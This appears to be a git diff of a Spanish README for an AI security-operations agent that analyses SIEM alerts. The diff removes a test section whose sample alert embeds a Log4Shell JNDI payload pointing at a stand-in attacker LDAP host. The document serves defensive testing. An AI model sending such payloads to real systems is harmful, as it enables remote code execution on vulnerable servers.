@@ -1,6 +1,6 @@
 # Agente SOC impulsado por IA 🛡️🧠
 
-Un Agente de Inteligencia Artificial diseñado para actuar como Analista de Nivel 2/Nivel 3 (L2/L3) de un Centro de Operaciones de Seguridad (SOC). Su misión principal es ingerir logs crudos y alertas de un SIEM (Security Information and Event Management) y determinar con alta precisión técnica si constituyen una vulnerabilidad, un ataque real o un falso positivo.
+Un Agente de Inteligencia Artificial diseñado para actuar como Analista de Nivel 2/Nivel 3 (L2/L3) de un Centro de Operaciones de Seguridad (SOC). Su misión principal es ingerir alertas de un SIEM (Security Information and Event Management) y determinar con alta precisión técnica si constituyen una vulnerabilidad, un ataque real o un falso positivo.
 
 ## Características Principales
 
@@ -53,35 +53,6 @@ LLM_TEMPERATURE=0.0
 uvicorn main:app --reload
 ```
 El agente se levantará escuchando en `http://localhost:8000`.
-
----
-
-## 🧪 Pruebas de Funcionamiento (Simulación SIEM)
-
-Puedes probar la capacidad del Agente enviándole un webhook estructurado que simula una alerta enviada por un Firewall, WAF o Endpoint. Usa el siguiente comando en otra terminal:
-
-**Ejemplo de Alerta: Intento de Explotación Log4Shell (Crítica)**
-```bash
-curl -X 'POST' 'http://localhost:8000/api/v1/webhook/analyze' \
--H 'Content-Type: application/json' \
--d '{
-  "event_id": "PANW-THREAT-998241",
-  "source": "PaloAlto-NGFW-Core",
-  "timestamp": "2026-03-24T22:15:33Z",
-  "event_type": "THREAT",
-  "severity": "CRITICAL",
-  "payload": {
-      "victim_ip": "10.150.2.45",
-      "attacker_ip": "198.51.100.42",
-      "threat_name": "Apache-Log4j-JNDI-Code-Injection",
-      "app": "web-browsing",
-      "raw_log": "GET /login HTTP/1.1\r\nHost: 10.150.2.45\r\nUser-Agent: ${jndi:ldap://198.51.100.42:1389/Exploit}\r\n",
-      "cve": "CVE-2021-44228"
-  }
-}'
-```
-
-El Agente evaluará el evento, buscará el CVE, analizará la IP, mapeará la técnica a MITRE ATT&CK, y devolverá un diagnóstico estructurado.
 
 ---
 
